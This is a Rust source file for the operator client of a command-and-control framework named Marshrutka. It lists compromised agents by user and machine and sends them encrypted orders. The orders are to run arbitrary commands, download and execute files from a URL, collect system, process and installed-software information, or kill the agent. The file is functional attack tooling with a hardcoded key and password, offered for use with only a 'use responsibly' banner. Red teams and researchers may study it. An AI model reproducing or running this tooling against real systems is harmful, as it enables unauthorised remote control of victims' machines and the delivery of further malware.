use anyhow::Result;
use chrono::Utc;
use clap::Parser;
use colored::Colorize;
use inquire::Select;
use inquire::Text;
use orion::aead::{seal, SecretKey};
use serde_json::{json, Value};
use std::io::Write;
use std::io::{self};
use std::io::{Error, ErrorKind, Read};
use std::net::TcpStream;
use std::process;
use std::thread;
use std::time::Duration;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// IP address of the C2 server
    #[arg(short, long, default_value = "127.0.0.1")]
    address: String,

    /// Port number of the C2 server
    #[arg(short, long, default_value_t = 8000)]
    port: u32,
}

// Define your hardcoded key (ew don't do this ever) as a byte array
const HARDCODED_KEY: [u8; 32] = [
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D,
    0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A,
    0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20,
];

const HARDCODED_PASSWORD: &str = "c7wkzzDlyzLWEspDBzEkU5usC5eIn7Qr";


fn main() -> Result<()> {
    let ascii_art = r"
                         _                _   _         
    /\/\   __ _ _ __ ___| |__  _ __ _   _| |_| | ____ _ 
   /    \ / _` | '__/ __| '_ \| '__| | | | __| |/ / _` |
  / /\/\ \ (_| | |  \__ \ | | | |  | |_| | |_|   < (_| |
  \/    \/\__,_|_|  |___/_| |_|_|   \__,_|\__|_|\_\__,_|
    ";

    println!(
        "{}\n  Client version {} | Created by Nathan Malcolm, use responsibly!\n",
        ascii_art.red(),
        env!("CARGO_PKG_VERSION")
    );

    let thread1 = thread::spawn(move || -> Result<()> {
        let secret_key = SecretKey::from_slice(&HARDCODED_KEY)?;

        loop {
            match connect_to_server() {
                Ok(mut stream) => {
                    // Send a request to the server
                    let mut message = json!({
                        "action": "get_agents",
                    });

                    send_message(&mut stream, &mut message, &secret_key)?;

                    let response = read_response(&mut stream)?;
                    debug(format!("Server response: {}", response));

                    match serde_json::from_str::<Value>(&response) {
                        Ok(parsed_response) => {
                            debug(format!("Parsed response: {:?}", parsed_response));

                            if let Some(agents) =
                                parsed_response.get("agents").and_then(|v| v.as_array())
                            {
                                let formatted_agent_names: Vec<String> = agents
                                    .iter()
                                    .filter_map(|agent| {
                                        let agent_id = agent.get("id").and_then(|id| id.as_u64());
                                        let machine_name = agent
                                            .get("computer_name")
                                            .and_then(|name| name.as_str());

                                        let username =
                                            agent.get("username").and_then(|name| name.as_str());

                                        let timestamp = agent
                                            .get("last_connection_timestamp")
                                            .and_then(|ts| ts.as_str());

                                        if let (
                                            Some(agent_id),
                                            Some(machine_name),
                                            Some(username),
                                            Some(timestamp),
                                        ) = (agent_id, machine_name, username, timestamp)
                                        {
                                            Some(format_agent_name(
                                                agent_id as u32,
                                                machine_name,
                                                username,
                                                timestamp,
                                            ))
                                        } else {
                                            None
                                        }
                                    })
                                    .collect();

                                if !formatted_agent_names.is_empty() {
                                    let ans =
                                        Select::new("Select an agent:", formatted_agent_names)
                                            .prompt();

                                    match ans {
                                        Ok(choice) => {
                                            println!("Selected agent: {}", choice);

                                            let selected_agent_id = agents.iter().find_map(|agent| {
                                                if let (Some(agent_id), Some(this_agent_id)) = (
                                                    agent.get("id").and_then(|id| id.as_u64()),
                                                    agent.get("id").and_then(|id| id.as_u64())
                                                ) {
                                                    if agent_id == this_agent_id {
                                                        return Some(agent_id as u32);
                                                    }
                                                }
                                                None
                                            });

                                            // Check if the agent ID was found
                                            if let Some(agent_id) = selected_agent_id {
                                                // Now, add the select menu for agent actions
                                                let options: Vec<&str> = vec![
                                                    "Run Command",
                                                    "Download & Execute",
                                                    "System Info",
                                                    "Process List",
                                                    "Installed Applications",
                                                    "Kill Agent",
                                                    "Back",
                                                ];
                                                let action =
                                                    Select::new("Select an action:", options)
                                                        .prompt();

                                                match action {
                                                    Ok(action_choice) => {
                                                        match action_choice {
                                                            "Run Command" => {
                                                                let command = Text::new(
                                                                "What command do you want to run?",
                                                            )
                                                            .prompt();

                                                                match command {
                                                                    Ok(command) => {
                                                                        match connect_to_server() {
                                                                            Ok(mut stream) => {
                                                                                println!(
                                                                                    "{}",
                                                                                    command
                                                                                );

                                                                                let mut message = json!({
                                                                                    "action": "system",
                                                                                    "command": command,
                                                                                    "agent_id": agent_id.to_string()
                                                                                });

                                                                                send_message(
                                                                                    &mut stream,
                                                                                    &mut message,
                                                                                    &secret_key,
                                                                                )?;

                                                                                let response =
                                                                                    read_response(
                                                                                        &mut stream,
                                                                                    )?;
                                                                                debug(format!(
                                                                            "Server response: {}",
                                                                            response
                                                                        ));
                                                                            }
                                                                            Err(_) => {
                                                                                println!("An error happened when asking for your command, try again later.\r")
                                                                            }
                                                                        }
                                                                    }
                                                                    Err(e) => {
                                                                        eprintln!("Error connecting to server: {}\r", e);
                                                                    }
                                                                }
                                                            }
                                                            "Download & Execute" => {
                                                                match connect_to_server() {
                                                                    Ok(mut stream) => {
                                                                        let url = Text::new("Enter the URL to download and execute:").prompt();

                                                                        match url {
                                                                            Ok(url) => {
                                                                                let mut message = json!({
                                                                                    "action": "builtin",
                                                                                    "command": "download",
                                                                                    "agent_id": agent_id.to_string(),
                                                                                    "options": json!({
                                                                                        "url": url
                                                                                    })
                                                                                });

                                                                                send_message(
                                                                                    &mut stream,
                                                                                    &mut message,
                                                                                    &secret_key,
                                                                                )?;

                                                                                let response =
                                                                                    read_response(
                                                                                        &mut stream,
                                                                                    )?;
                                                                                debug(format!(
                                                                            "Server response: {}",
                                                                            response
                                                                        ));
                                                                            }
                                                                            Err(e) => {
                                                                                eprintln!("Error entering URL: {}\r", e);
                                                                            }
                                                                        }
                                                                    }
                                                                    Err(e) => {
                                                                        eprintln!("Error connecting to server: {}\r", e);
                                                                    }
                                                                }
                                                            }
                                                            "System Info" => {
                                                                match connect_to_server() {
                                                                    Ok(mut stream) => {
                                                                        let mut message = json!({
                                                                            "action": "builtin",
                                                                            "command": "sysinfo",
                                                                            "agent_id": agent_id.to_string()
                                                                        });

                                                                        send_message(
                                                                            &mut stream,
                                                                            &mut message,
                                                                            &secret_key,
                                                                        )?;

                                                                        let response =
                                                                            read_response(
                                                                                &mut stream,
                                                                            )?;
                                                                        debug(format!(
                                                                            "Server response: {}",
                                                                            response
                                                                        ));
                                                                    }
                                                                    Err(e) => {
                                                                        eprintln!("Error connecting to server: {}\r", e);
                                                                    }
                                                                }
                                                            }
                                                            "Process List" => {
                                                                match connect_to_server() {
                                                                    Ok(mut stream) => {
                                                                        let mut message = json!({
                                                                            "action": "builtin",
                                                                            "command": "processlist",
                                                                            "agent_id": agent_id.to_string()
                                                                        });

                                                                        send_message(
                                                                            &mut stream,
                                                                            &mut message,
                                                                            &secret_key,
                                                                        )?;

                                                                        let response =
                                                                            read_response(
                                                                                &mut stream,
                                                                            )?;
                                                                        debug(format!(
                                                                            "Server response: {}",
                                                                            response
                                                                        ));
                                                                    }
                                                                    Err(e) => {
                                                                        eprintln!("Error connecting to server: {}\r", e);
                                                                    }
                                                                }
                                                            }
                                                            "Installed Applications" => {
                                                                match connect_to_server() {
                                                                    Ok(mut stream) => {
                                                                        let mut message = json!({
                                                                            "action": "builtin",
                                                                            "command": "installed_applications",
                                                                            "agent_id": agent_id.to_string()
                                                                        });

                                                                        send_message(
                                                                            &mut stream,
                                                                            &mut message,
                                                                            &secret_key,
                                                                        )?;

                                                                        let response =
                                                                            read_response(
                                                                                &mut stream,
                                                                            )?;
                                                                        debug(format!(
                                                                            "Server response: {}",
                                                                            response
                                                                        ));
                                                                    }
                                                                    Err(e) => {
                                                                        eprintln!("Error connecting to server: {}\r", e);
                                                                    }
                                                                }
                                                            }
                                                            "Kill Agent" => {
                                                                match connect_to_server() {
                                                                    Ok(mut stream) => {
                                                                        let mut message = json!({
                                                                            "action": "builtin",
                                                                            "command": "kill_agent",
                                                                            "agent_id": agent_id.to_string()
                                                                        });

                                                                        send_message(
                                                                            &mut stream,
                                                                            &mut message,
                                                                            &secret_key,
                                                                        )?;

                                                                        let response =
                                                                            read_response(
                                                                                &mut stream,
                                                                            )?;
                                                                        debug(format!(
                                                                            "Server response: {}",
                                                                            response
                                                                        ));
                                                                    }
                                                                    Err(e) => {
                                                                        eprintln!("Error connecting to server: {}\r", e);
                                                                    }
                                                                }
                                                            }
                                                            "Back" => {
                                                                // Exit the inner loop to go back to agent selection
                                                                continue;
                                                            }
                                                            _ => {
                                                                println!("Invalid choice\r");
                                                            }
                                                        }
                                                    }
                                                    Err(e) => {
                                                        if e.to_string()
                                                            != "Operation was canceled by the user"
                                                        {
                                                            println!(
                                                                "There was an error selecting an action: {}\r", e
                                                            );
                                                        }
                                                    }
                                                }
                                            } else {
                                                println!(
                                                    "Failed to find the selected agent's ID.\r"
                                                );
                                            }
                                        }
                                        Err(e) => {
                                            // InquireError::OperationInterrupted
                                            if e.to_string()
                                                == "Operation was interrupted by the user"
                                            {
                                                println!("^C");
                                                process::exit(0);
                                            } else {
                                                println!(
                                                    "There was an error, please try again: {}\r",
                                                    e
                                                );
                                            }
                                        }
                                    }
                                } else {
                                    println!("No agents, sleeping...");
                                    thread::sleep(Duration::from_secs(5));
                                }
                            }
                        }
                        Err(error) => {
                            eprintln!(
                                "Error parsing JSON response: {:?}, JSON: {:?}\r",
                                error, response
                            );
                        }
                    }
                }
                Err(e) => {
                    eprintln!("Error connecting to server: {}\r", e);
                }
            }
        }
    });

    let thread2 = thread::spawn(move || -> Result<()> {
        let secret_key = SecretKey::from_slice(&HARDCODED_KEY)?;

        loop {
            match connect_to_server() {
                Ok(mut stream) => {
                    // Send a request to the server
                    let mut message = json!({
                        "action": "get_command_outputs",
                    });

                    send_message(&mut stream, &mut message, &secret_key)?;

                    let response = read_response(&mut stream)?;
                    debug(format!("Server response: {}", response));

                    // Parse the response JSON
                    let parsed_response = serde_json::from_str::<Value>(&response)?;

                    if let Some(command_output) = parsed_response
                        .get("command_output")
                        .and_then(|v| v.as_array())
                    {
                        for output_entry in command_output {
                            if let (Some(agent_id), Some(output)) = (
                                output_entry.get("agent_id").and_then(|id| id.as_u64()),
                                output_entry.get("output").and_then(|o| o.as_str()),
                            ) {
                                print_command_output(format!("Agent ID: {}\n{}", agent_id, output));
                            }
                        }
                    }
                }
                Err(e) => {
                    eprintln!("Error connecting to server: {}\r", e);
                }
            }

            thread::sleep(Duration::from_secs(5));
        }

        // Ok(())
    });

    // These threads will never finish
    let _ = thread1.join().unwrap();
    let _ = thread2.join().unwrap();

    Ok(())
}

fn connect_to_server() -> Result<TcpStream, Error> {
    let args = Args::parse();

    TcpStream::connect(format!("{}:{}", args.address, args.port))
}

fn send_message(
    stream: &mut TcpStream,
    message: &mut Value,
    secret_key: &SecretKey,
) -> Result<(), Error> {
    // Add another field dynamically
    let additional_field_name = "password";
    let additional_field_value = HARDCODED_PASSWORD;
    let additional_field = json!(additional_field_value);

    if let Value::Object(ref mut map) = message {
        map.insert(additional_field_name.to_string(), additional_field);
    }

    debug(message.to_string());

    let json_data = serde_json::to_string(&message)?;
    let json_bytes = json_data.as_bytes();

    let ciphertext_result = seal(secret_key, json_bytes);

    match ciphertext_result {
        Ok(ciphertext) => {
            let ciphertext_bytes = ciphertext;
            stream.write_all(&ciphertext_bytes)?;
            Ok(())
        }
        Err(e) => {
            // Convert the error to a std::io::Error with a custom message
            Err(Error::new(
                ErrorKind::Other,
                format!("Failed to seal message: {}", e),
            ))
        }
    }
}

fn read_response(stream: &mut TcpStream) -> Result<String, Error> {
    let mut buffer = [0; 500000];
    stream.read(&mut buffer)?;
    let response_original = String::from_utf8_lossy(&buffer);
    let response = response_original.trim_matches(char::from(0));
    Ok(response.to_string())
}

fn format_agent_name(
    agent_id: u32,
    machine_name: &str,
    username: &str,
    last_connected: &str,
) -> String {
    // Parse the last connected timestamp into a DateTime<Utc> object
    let last_connected_datetime = last_connected
        .parse::<chrono::DateTime<Utc>>()
        .unwrap_or_else(|_| Utc::now());

    // Calculate the time difference between the current time and the last connected time
    let time_difference = Utc::now() - last_connected_datetime;

    // Format the relative time as a string
    let relative_time = if time_difference.num_seconds() < 60 {
        format!("[{} seconds ago]", time_difference.num_seconds()).green()
    } else if time_difference.num_minutes() < 2 {
        format!("[{} minutes ago]", time_difference.num_minutes()).green()
    } else if time_difference.num_minutes() < 5 {
        format!("[{} minutes ago]", time_difference.num_minutes()).yellow()
    } else if time_difference.num_minutes() < 60 {
        format!("[{} minutes ago]", time_difference.num_minutes()).red()
    } else {
        let hours = time_difference.num_hours();
        format!("[{} hours ago]", hours).red()
    };

    format!(
        "[ID: {}] {} {}",
        format!("{}", agent_id).bold(),
        format!("{}@{}", username, machine_name).bold(),
        relative_time
    )
}

fn debug(_message: String) {
    #[cfg(debug_assertions)]
    println!("{}", format!("DEBUG: {}\r", _message).blue());
}

fn print_command_output(message: String) {
    print!("{esc}[2J{esc}[1;1H", esc = 27 as char);
    // This should never panic
    io::stdout().flush().unwrap();

    let mut modified_message = format!(
        "================================================\n{}",
        message
    );
    modified_message = prepend_to_lines(modified_message.as_str(), "> ");
    modified_message = format!(
        "{}\n================================================\n",
        modified_message
    );
    println!(
        "{}",
        format!("{}", newline_converter::unix2dos(&modified_message)).yellow()
    );
}

fn prepend_to_lines(input: &str, prefix: &str) -> String {
    input
        .lines() // Split the input string into lines
        .map(|line| format!("{}{}", prefix, line)) // Prepend the prefix to each line
        .collect::<Vec<String>>() // Collect the modified lines into a vector
        .join("\n") // Join the lines back together with newline characters
}
